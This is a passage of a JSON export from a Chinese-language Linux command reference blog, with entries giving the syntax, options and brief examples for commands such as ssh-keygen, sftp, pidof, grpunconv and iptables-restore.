read","time":35000,"words":160,"minutes":1},"date":"2022-02-01 17:18:57","dateFormat":"2022-02-01"},{"content":"将文件的空白字符转换为制表符。 补充说明 unexpand 命令用于将给定文件中的空白字符（space）转换为制表符（TAB），并把转换结果显示在标准输出设备（显示终端）。 语法 unexpand (选项) (参数) 选项 -a 或--all：转换文件中所有的空白字符； --first-only：仅转换开头的空白字符； -t&lt;N&gt;：指定 TAB 所代表的 N 个（N 为整数）字符数，默认 N 值是 8。 参数 文件：指定要转换空白为 TAB 的文件列表。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"unexpand","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/unexpand/","stats":{"text":"1 min read","time":31000,"words":141,"minutes":1},"date":"2022-02-01 17:18:31","dateFormat":"2022-02-01"},{"content":"为 ssh 生成、管理和转换认证密钥。 补充说明 ssh-keygen 命令用于为“ssh”生成、管理和转换认证密钥，它支持 RSA 和 DSA 两种认证密钥。 语法 ssh-keygen (选项) 选项 -b：指定密钥长度； -e：读取 openssh 的私钥或者公钥文件； -C：添加注释； -f：指定用来保存密钥的文件名； -i：读取未加密的 ssh-v2 兼容的私钥/公钥文件，然后在标准输出设备上显示 openssh 兼容的私钥/公钥； -l：显示公钥文件的指纹数据； -N：提供一个新密语； -P：提供（旧）密语； -q：静默模式； -t：指定要创建的密钥类型。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ssh-keygen","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ssh-keygen/","stats":{"text":"1 min read","time":38000,"words":174,"minutes":1},"date":"2022-02-01 17:18:18","dateFormat":"2022-02-01"},{"content":"将较大的 zip 压缩包分割成各个较小的压缩包。 补充说明 zipsplit 命令用于将较大的“zip”压缩包分割成各个较小的“zip”压缩包。 语法 zipsplit (选项) (参数) 选项 -n：指定分割后每个 zip 文件的大小； -t：报告将要产生的较小的 zip 文件的大小； -b：指定分割后的 zip 文件的存放位置。 参数 文件：指定要分割的 zip 压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"zipsplit","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/zipsplit/","stats":{"text":"1 min read","time":25000,"words":117,"minutes":1},"date":"2022-02-01 17:17:52","dateFormat":"2022-02-01"},{"content":"Debian Linux 中软件包安装之前询问问题。 补充说明 dpkg-preconfigure 命令用于在 Debian Linux 中软件包安装之前询问问题。 语法 dpkg-preconfigure (选项) (参数) 选项 -f：选择使用的前端； -p：感兴趣的最低的优先级问题； --apt：在 apt 模式下运行。 参数 软件包：指定“.deb”软件包。 实例 导入 debconf 模板： dpkg-preconfigure /var/cache/apt/archives/mysql-server-5.5*.deb ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-preconfigure","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-preconfigure/","stats":{"text":"1 min read","time":25000,"words":107,"minutes":1},"date":"2022-02-01 17:17:34","dateFormat":"2022-02-01"},{"content":"squid 服务器的客户端管理工具。 补充说明 squidclient 命令使用 squid 服务器的客户端管理工具，它可以查看 squid 服务器的详细运行信息和管理 squid 服务器。 语法 squidclient (选项) (参数) 选项 -a：不包含“accept:header”； -r：强制缓存重新加载 URL； -s：安静模式，不输出信息到标准输出设备； -h：从指定主机获取 url-l：指定一个本地 ip 地址进行绑定； -p：端口号，默认为 3128； -m：指定发送请求的方法； -u：代理认证用户名。 参数 URL：指定操作缓存中的 URL。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"squidclient","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/squidclient/","stats":{"text":"1 min read","time":35000,"words":159,"minutes":1},"date":"2022-02-01 17:17:15","dateFormat":"2022-02-01"},{"content":"查找指定名称的进程的进程号 ID 号。 补充说明 pidof 命令用于查找指定名称的进程的进程号 id 号。 语法 pidof (选项) (参数) 选项 -s：仅返回一个进程号； -c：仅显示具有相同“root”目录的进程； -x：显示由脚本开启的进程； -o：指定不显示的进程 ID。 参数 进程名称：指定要查找的进程名称。 实例 pidof nginx 13312 5371 pidof crond 1509 pidof init 1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pidof","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pidof/","stats":{"text":"1 min read","time":27000,"words":120,"minutes":1},"date":"2022-02-01 17:16:38","dateFormat":"2022-02-01"},{"content":"用来关闭群组的投影密码。 补充说明 grpunconv 命令用来关闭群组的投影密码。它会把密码从 gshadow 文件内，回存到 group 文件里。 语法 grpunconv 实例 未关闭的情况 cat /etc/gshadow | grep cdycdy:123456:: 关闭影子密码 cat /etc/gshadowcat: /etc/gshadow: 没有那个文件或目录 查看密码已经复制到/etc/group中了。 cat /etc/group | grep cdycdy:123456:1000: ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"grpunconv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/grpunconv/","stats":{"text":"1 min read","time":24000,"words":103,"minutes":1},"date":"2022-02-01 17:15:25","dateFormat":"2022-02-01"},{"content":"交互式的文件传输程序。 补充说明 sftp 命令是一款交互式的文件传输程序，命令的运行和使用方式与 ftp 命令相似，但是，sftp 命令对传输的所有信息使用 ssh 加密，它还支持公钥认证和压缩等功能。 语法 sftp (选项) (参数) 选项 -B：指定传输文件时缓冲区的大小； -l：使用 ssh 协议版本 1； -b：指定批处理文件； -C：使用压缩； -o：指定 ssh 选项； -F：指定 ssh 配置文件； -R：指定一次可以容忍多少请求数； -v：升高日志等级。 参数 目标主机：指定 sftp 服务器 ip 地址或者主机名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sftp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sftp/","stats":{"text":"1 min read","time":38000,"words":178,"minutes":1},"date":"2022-02-01 17:14:27","dateFormat":"2022-02-01"},{"content":"标签或 UUID 查找文件系统。 补充说明 findfs 命令依据卷标（Label）和 UUID 查找文件系统所对应的设备文件。findfs 命令会搜索整个磁盘，看是否有匹配的标签或者 UUID 没有，如果有则打印到标注输出上。findfs 命令也是 e2fsprogs 项目的一部分。 语法 findfs(参数) 参数 LABEL=&lt;卷标&gt;或者UUID=&lt;UUID&gt;：按照卷标或者 UUID 查询文件系统。 实例 通过卷标名查找对应的文件系统： findfs LABEL=/boot /dev/hda1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"findfs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/findfs/","stats":{"text":"1 min read","time":31000,"words":138,"minutes":1},"date":"2022-02-01 17:11:54","dateFormat":"2022-02-01"},{"content":"关闭 Linux 内核中指定文件系统的磁盘配额功能。 补充说明 quotaoff 命令用于关闭 Linux 内核中指定文件系统的磁盘配额功能。 语法 quotaoff (选项)(参数) 选项 -a：关闭在/etc/fstab 文件里，有加入 quota 设置的分区的空间限制； -g：关闭群组的磁盘空间限制； -u：关闭用户的磁盘空间限制； -v：显示指令执行过程。 参数 文件系统：指定要关闭磁盘配额功能的文件系统。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"quotaoff","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/quotaoff/","stats":{"text":"1 min read","time":28000,"words":134,"minutes":1},"date":"2022-02-01 17:10:31","dateFormat":"2022-02-01"},{"content":"纯文本邮件客户端程序。 补充说明 elm 命令是一个 E-mail 客户端管理程序，它提供了纯文本交互式全屏幕界面。 语法 elm (选项) 选项 -s&lt;邮件主题&gt;：指定新邮件的邮件主题； -f&lt;目录&gt;：开启程序时，读取指定的目录； -h：显示帮助； -i&lt;文件名&gt;：将文件内容插入送出的邮件中； -m：进入 elm 后，不显示指令说明； -v：显示 elm 的版本信息； -z：若收件信箱没有邮件，则不启动 elm 程序。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"elm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/elm/","stats":{"text":"1 min read","time":32000,"words":147,"minutes":1},"date":"2022-02-01 17:08:20","dateFormat":"2022-02-01"},{"content":"指示打印系统拒绝发往指定目标打印机的打印任务。 补充说明 reject 命令属于 CUPS 套件，用于指示打印系统拒绝发往指定目标打印机的打印任务。 语法 reject (选项) (参数) 选项 -E：当连接到服务器时强制使用加密； -U：指定连接服务器时使用的用户名； -h：指定连接服务器名和端口号； -r：指定拒绝打印任务的原因。 参数 目标：指定目标打印机。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"reject","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/reject/","stats":{"text":"1 min read","time":27000,"words":133,"minutes":1},"date":"2022-02-01 17:07:56","dateFormat":"2022-02-01"},{"content":"列出显示器中的客户端应用程序。 补充说明 xlsclients 命令用来列出显示器中的客户端应用程序。 语法 xlsclients (选项) 选项 -a：列出所有显示器的客户端应用程序信息； -display&lt;显示器编号&gt;：指定X Server连接的显示器编号，该编号由&quot;0&quot;开始计算，依序递增； -l：使用详细格式列表； -m&lt;最大指令长度&gt;：设置显示指令信息的最大长度，单位以字符计算。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xlsclients","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xlsclients/","stats":{"text":"1 min read","time":29000,"words":135,"minutes":1},"date":"2022-02-01 17:07:26","dateFormat":"2022-02-01"},{"content":"从 RPM 数据库中查询软件包信息。 补充说明 rpmquery 命令使用多种依据从 rpm 数据库中查询软件包信息。 语法 rpmquery (选项) 选项 -qf：查询指定的文件所属的软件包； -q：查询指定的软件包是否被安装； -qc：查询软件包中的配置文件； -qd：查询软件包中的文档文件； -qi：查询软件包的基本信息。 实例 使用 rpmquery 命令查询指定文件所属的软件包： [root@localhost ~]# rpmquery -qf /usr/bin/htpasswd httpd-2.2.3-81.el5.centos ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpmquery","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpmquery/","stats":{"text":"1 min read","time":32000,"words":142,"minutes":1},"date":"2022-02-01 17:07:07","dateFormat":"2022-02-01"},{"content":"显示 CUPS 中打印机的状态信息。 补充说明 lpstat 命令用于显示 CUPS 中打印机的状态信息。 语法 lpstat (选项) 选项 -E：与打印机连接时加密； -R：显示打印任务的等级； -U：指定可选用户名； -a：显示接受打印任务的打印机； -c：显示打印机类； -d：显示默认打印机； -h：指定可选的服务器信息； -l：显示长格式； -p：显示指定打印机，以及打印机是否接受打印任务； -s：显示汇总信息； -t：显示所有的状态信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lpstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lpstat/","stats":{"text":"1 min read","time":32000,"words":151,"minutes":1},"date":"2022-02-01 17:06:53","dateFormat":"2022-02-01"},{"content":"检查文件中不可移植的部分。 补充说明 pathchk 命令用来检查文件中不可移植的部分。 语法 pathchk (选项) (参数) 选项 -p：检查大多数的 POSIX 系统； -P：检查空名字和“-”开头的文件； --portability：检查所有的 POSIX 系统，等同于“-P-p”选项； --help：显示帮助； --wersion：显示版本号。 参数 文件：带路径信息的文件； 后缀：可选参数，指定要去除的文件后缀字符串。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pathchk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pathchk/","stats":{"text":"1 min read","time":26000,"words":122,"minutes":1},"date":"2022-02-01 17:06:35","dateFormat":"2022-02-01"},{"content":"显示目录堆栈。 概要 dirs [-clpv] [+N] [-N] 主要用途 显示目录堆栈。 清空目录堆栈。 选项 -c 清空目录堆栈。 -l 堆栈内以~开头的目录在显示时展开。 -p 将目录堆栈内的每一个目录按行显示。 -v 将目录堆栈内的每一个目录按行显示并在每行前加上堆栈内的位置编号。 参数 +N（可选）：不带参数执行dirs命令显示的列表中，左起的第 N 个目录将被显示。（从 0 开始计数） -N（可选）：不带参数执行dirs命令显示的列表中，右起的第 N 个目录将被显示。（从 0 开始计数） 返回值 返回成功除非提供了非法选项或执行出现错误。 例子 # 添加目录到堆栈。 [user2@pc ~]$ dirs ~ [user2@pc ~]$ pushd -n ~/Desktop ~ ~/Desktop [user2@pc ~]$ pushd -n ~/Pictures ~ ~/Pictures ~/Desktop [user2@pc ~]$ pushd -n ~/bin ~ ~/bin ~/Pictures ~/Desktop # 选项和参数的示例： [user2@pc ~]$ dirs -l /home/user2 /home/user2/bin /home/user2/Pictures /home/user2/Desktop [user2@pc ~]$ dirs -p ~ ~/bin ~/Pictures ~/Desktop [user2@pc ~]$ dirs -v 0 ~ 1 ~/bin 2 ~/Pictures 3 ~/Desktop [user2@pc ~]$ dirs +2 ~/Pictures [user2@pc ~]$ dirs -2 ~/bin [user2@pc ~]$ dirs -c [user2@pc ~]$ dirs ~ 注意 bash的目录堆栈命令包括dirs popd pushd。 当前目录始终是目录堆栈的顶部。 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dirs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dirs/","stats":{"text":"2 min read","time":84000,"words":340,"minutes":2},"date":"2022-02-01 17:05:59","dateFormat":"2022-02-01"},{"content":"用来解压.Z 文件。 补充说明 uncompress 命令用来解压缩由 compress 命令压缩后产生的“.Z”压缩包。 语法 uncompress (选项) (参数) 选项 -f：不提示用户，强制覆盖掉目标文件； -c：将结果送到标准输出，无文件被改变； -r：递归的操作方式。 参数 文件：指定要压缩的“.Z”压缩包。 实例 先创建一个.Z 压缩文件 compress FileName 解压： uncompress FileName.Z ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uncompress","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uncompress/","stats":{"text":"1 min read","time":25000,"words":114,"minutes":1},"date":"2022-02-01 17:05:54","dateFormat":"2022-02-01"},{"content":"将文件传送到远端的 UUCP 主机。 补充说明 uuto 命令为 script 文件，它实际上会执行 uucp，用来将文件传送到远端 UUCP 主机，并在完成工作后，以邮件通知远端主机上的用户。 语法 uuto [文件 ][目的 ] 例子 将文件传送到远程 UUCP 主机 localhost 的 tmp 目录，在命令提示符中直接输入如下命令： uuto./testfile localhost/tmp # 将文件传送到远程 UUCP 主机 localhost 的 tmp 目录 该命令通常没有输出。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"uuto","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/uuto/","stats":{"text":"1 min read","time":29000,"words":133,"minutes":1},"date":"2022-02-01 17:05:32","dateFormat":"2022-02-01"},{"content":"显示待发送的邮件队列。 补充说明 mailq 命令用户显示待发送的邮件队列，显示的每一个条目包括邮件队列 id、邮件大小、加入队列时间、邮件发送者和接受者。如果邮件最后一次尝试后还没有将邮件投递出去，则显示发送失败的原因。 语法 mailq (选项) 选项 -v：显示详细的信息。 实例 [root@localhost ~]# mailq -v /var/spool/mqueue is empty Total requests: 0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mailq","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mailq/","stats":{"text":"1 min read","time":27000,"words":123,"minutes":1},"date":"2022-02-01 17:05:11","dateFormat":"2022-02-01"},{"content":"显示到达的邮件状态。 补充说明 mailstat 命令用来显示到达的邮件状态。 语法 mailstat (选项) (参数) 选项 -k：保持邮件日志文件的完整性，不清空日志文件； -l：使用长格式显示邮件状态； -m：合并任何错误信息到一行中显示； -o：使用老的邮件日志邮件； -t：使用简洁的格式显示邮件状态； -s：如果没有邮件则不输出任何信息。 参数 邮件日志文件：指定要读取邮件日志文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mailstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mailstat/","stats":{"text":"1 min read","time":29000,"words":142,"minutes":1},"date":"2022-02-01 17:04:53","dateFormat":"2022-02-01"},{"content":"用来压缩可执行文件。 补充说明 gzexe 命令用来压缩可执行文件，压缩后的文件仍然为可执行文件，在执行时进行自动解压缩。当您去执行被压缩过的执行文件时，该文件会自动解压然后继续执行，和使用一般的执行文件相同。这个命令也可以看成是 gunzip 命令的一个扩展。 语法 gzexe (选项) (参数) 选项 -d：解压缩被 gzexe 压缩过的可执行文件。 参数 文件：指定需要压缩的可执行文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gzexe","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gzexe/","stats":{"text":"1 min read","time":30000,"words":149,"minutes":1},"date":"2022-02-01 17:04:25","dateFormat":"2022-02-01"},{"content":"更改群组识别码或名称。 补充说明 groupmod 命令更改群组识别码或名称。需要更改群组的识别码或名称时，可用 groupmod 指令来完成这项工作。 语法 groupmod (选项) (参数) 选项 -g&lt;群组识别码&gt;：设置欲使用的群组识别码； -o：重复使用群组识别码； -n&lt;新群组名称&gt;：设置欲使用的群组名称。 参数 组名：指定要修改的工作的组名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"groupmod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/groupmod/","stats":{"text":"1 min read","time":26000,"words":124,"minutes":1},"date":"2022-02-01 17:04:01","dateFormat":"2022-02-01"},{"content":"关闭指定的交换空间。 补充说明 swapoff 命令用于关闭指定的交换空间（包括交换文件和交换分区）。swapoff 实际上为 swapon 的符号连接，可用来关闭系统的交换区。 语法 swapoff (选项) (参数) 选项 -a：关闭配置文件“/etc/fstab”中所有的交换空间。 参数 交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。 实例 关闭交换分区 swapoff /dev/sda2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"swapoff","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/swapoff/","stats":{"text":"1 min read","time":31000,"words":147,"minutes":1},"date":"2022-02-01 17:03:40","dateFormat":"2022-02-01"},{"content":"收集主机公钥的使用工具。 补充说明 ssh-keyscan 命令是一个收集大量主机公钥的使用工具。 语法 ssh-keyscan (选项) (参数) 选项 -4：强制使用 IPv4 地址； -6：强制使用 IPv6 地址； -f：从指定文件中读取“地址列表/名字列表”； -p：指定连接远程主机的端口； -T：指定连接尝试的超时时间； -t：指定要创建的密钥类型； -v：信息模式，打印调试信息。 参数 主机列表：指定要收集公钥的主机列表。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ssh-keyscan","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ssh-keyscan/","stats":{"text":"1 min read","time":30000,"words":142,"minutes":1},"date":"2022-02-01 17:02:36","dateFormat":"2022-02-01"},{"content":"samba 用户和密码管理工具。 补充说明 smbpasswd 命令属于 samba 套件，能够实现添加或删除 samba 用户和为用户修改密码。 语法 smbpasswd (选项) (参数) 选项 -a：向 smbpasswd 文件中添加用户； -c：指定 samba 的配置文件； -x：从 smbpasswd 文件中删除用户； -d：在 smbpasswd 文件中禁用指定的用户； -e：在 smbpasswd 文件中激活指定的用户； -n：将指定的用户的密码置空。 参数 用户名：指定要修改 SMB 密码的用户。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"smbpasswd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/smbpasswd/","stats":{"text":"1 min read","time":29000,"words":134,"minutes":1},"date":"2022-02-01 17:01:57","dateFormat":"2022-02-01"},{"content":"将文本文件转换成适合打印的格式。 补充说明 pr 命令用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。 语法 pr (选项) (参数) 选项 -h&lt;标题&gt;：为页指定标题； -l&lt;行数&gt;：指定每页的行数。 参数 文件：需要转换格式的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pr","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pr/","stats":{"text":"1 min read","time":24000,"words":114,"minutes":1},"date":"2022-02-01 17:01:37","dateFormat":"2022-02-01"},{"content":"显示打印队列中的打印任务的状态信息。 补充说明 lpq 命令用于显示打印队列中的打印任务的状态信息。 语法 lpq (选项) 选项 -E：强制使用加密方式与服务器连接； -P：显示中的打印机上的打印队列状态； -U：自动可选的用户名； -a：报告所有打印机的定义任务； -h：指定打印服务器信息； -l：使用长格式输出； +：指定显示状态的间隔时间。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lpq","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lpq/","stats":{"text":"1 min read","time":27000,"words":132,"minutes":1},"date":"2022-02-01 17:01:16","dateFormat":"2022-02-01"},{"content":"显示 Linux 系统的网路状态。 补充说明 lnstat 命令用来显示 Linux 系统的网路状态。 语法 lnstat (选项) 选项 -h：显示帮助信息； -V：显示指令版本信息； -c：指定显示网络状态的次数，每隔一定时间显示一次网络状态； -d：显示可用的文件或关键字； -i：指定两次显示网络状的间隔秒数； -k：只显示给定的关键字； -s：是否显示标题头； -w：指定每个字段所占的宽度。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lnstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lnstat/","stats":{"text":"1 min read","time":29000,"words":135,"minutes":1},"date":"2022-02-01 17:01:01","dateFormat":"2022-02-01"},{"content":"重复打印指定字符串。 补充说明 yes 命令在命令行中输出指定的字符串，直到 yes 进程被杀死。不带任何参数输入 yes 命令默认的字符串就是 y。 语法 yes (参数) 参数 字符串：指定要重复打印的字符串。 实例 [root@localhost ~]# yes testline testline testline testline testline testline testline testline testline ...一直重复打印 testline，按Ctrl+C结束。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"yes","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/yes/","stats":{"text":"1 min read","time":24000,"words":104,"minutes":1},"date":"2022-02-01 17:00:31","dateFormat":"2022-02-01"},{"content":"还原 iptables 表的配置。 补充说明 iptables-restore 命令用来还原 iptables-save 命令所备份的 iptables 配置。 语法 iptables-restor (选项) 选项 -c：指定在还原 iptables 表时候，还原当前的数据包计数器和字节计数器的值； -t：指定要还原表的名称。 实例 iptables-restor &lt; iptables.bak iptables.bak 是 iptables-save 命令所备份的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iptables-restore","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iptables-restore/","stats":{"text":"1 min read","time":22000,"words":97,"minutes":1},"date":"2022-02-01 17:00:04","dateFormat":"2022-02-01"},{"content":"将命令的输出信息保存到指定的日志文件。 补充说明 logsave 命令运行给定的命令，并将命令的输出信息保存到指定的日志文件中。 语法 logsave (选项) (参数) 选项 -a：追加信息到指定的日志文件中。 参数 日志文件：指定记录运行信息的日志文件； 指令：需要执行的指令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"logsave","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/logsave/","stats":{"text":"1 min read","time":21000,"words":103,"minutes":1},"date":"2022-02-01 16:59:47","dateFormat":"2022-02-01"},{"content":"显示 iptables 的工作状态。 补充说明 iptstate 命令以 top 指令类似的风格时显示 Linux 内核中 iptables 的工作状态。 语法 iptstate (选项) 选项 -b：指定输出信息的排序规则； -d：不动态地改变窗口大小； -f：过滤本地回送信息； -l：将 ip 地址解析为域名； -L：隐藏于 DNS 查询相关状态； -r：指定刷新屏幕的频率； -R：反序排列； -s：单次运行模式； -t：显示汇总信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"iptstate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/iptstate/","stats":{"text":"1 min read","time":28000,"words":126,"minutes":1},"date":"2022-02-01 16:59:26","dateFormat":"2022-02-01"},{"content":"将多个文件按列队列合并。 补充说明 paste 命令用于将多个文件按照列队列进行合并。 语法 paste (选项) (参数) 选项 -d&lt;间隔字符&gt;或--delimiters=&lt;间隔字符&gt;：用指定的间隔字符取代跳格字符； -s 或——serial 串列进行而非平行处理。 参数 文件列表：指定需要合并的文件列表。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"paste","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/paste/","stats":{"text":"1 min read","time":22000,"words":102,"minutes":1},"date":"2022-02-01 16:58:33","dateFormat":"2022-02-01"},{"content":"Apache 服务器内置工具。 补充说明 htdigest 命令是 Apache 的 Web 服务器内置工具，用于创建和更新储存用户名、域和用于摘要认证的密码文件。 语法 htdigest (选项) (参数) 选项 -c：创建密码文件。 参数 密码文件：指定要创建或更新的密码文件； 域：指定用户名所属的域； 用户名：要创建或者更新的用户名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"htdigest","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/htdigest/","stats":{"text":"1 min read","time":23000,"words":110,"minutes":1},"date":"2022-02-01 16:58:14","dateFormat":"2022-02-01"},{"content":"显示连接到当前标准输入的终端设备文件名。 补充说明 tty 命令可以显示连接到当前标准输入的终端设备文件名。 语法 tty [选项 ] 选项 -s 什么也不显示，只返回退出状态值 例子 显示连接到当前标准输入的终端设备文件名。 [root@localhost ~]# tty/dev/pts/0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tty","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tty/","stats":{"text":"1 min read","time":20000,"words":96,"minutes":1},"date":"2022-02-01 16:57:58","dateFormat":"2022-02-01"},{"content":"将文件的制表符转换为空白字符。 补充说明 expand 命令用于将文件的制表符（TAB）转换为空白字符（space），将结果显示到标准输出设备。 语法 expand (选项) (参数) 选项 数字&gt;：指定制表符所代表的空白字符的个数，而不使用默认的 8。 参数 文件：指定要转换制表符为空白的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"expand","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/expand/","stats":{"text":"1 min read","time":22000,"words":105,"minutes":1},"date":"2022-02-01 16:57:25","dateFormat":"2022-02-01"},{"content":"连接远程主机并执行命令。 补充说明 rsh 命令用于连接到远程的指定主机并执行指定的命令。 语法 rsh (选项) (参数) 选项 -d：使用 Socket 层级的排错功能； -l&lt;用户名称&gt;：指定要登入远端主机的用户名称； -n：把输入的指令号向代号为/dev/null 的特殊外围设备。 参数 远程主机：指定要连接的远程主机； 指令：指定要在远程主机上执行的命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rsh","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rsh/","stats":{"text":"1 min read","time":28000,"words":132,"minutes":1},"date":"2022-02-01 16:56:24","dateFormat":"2022-02-01"},{"content":"squid 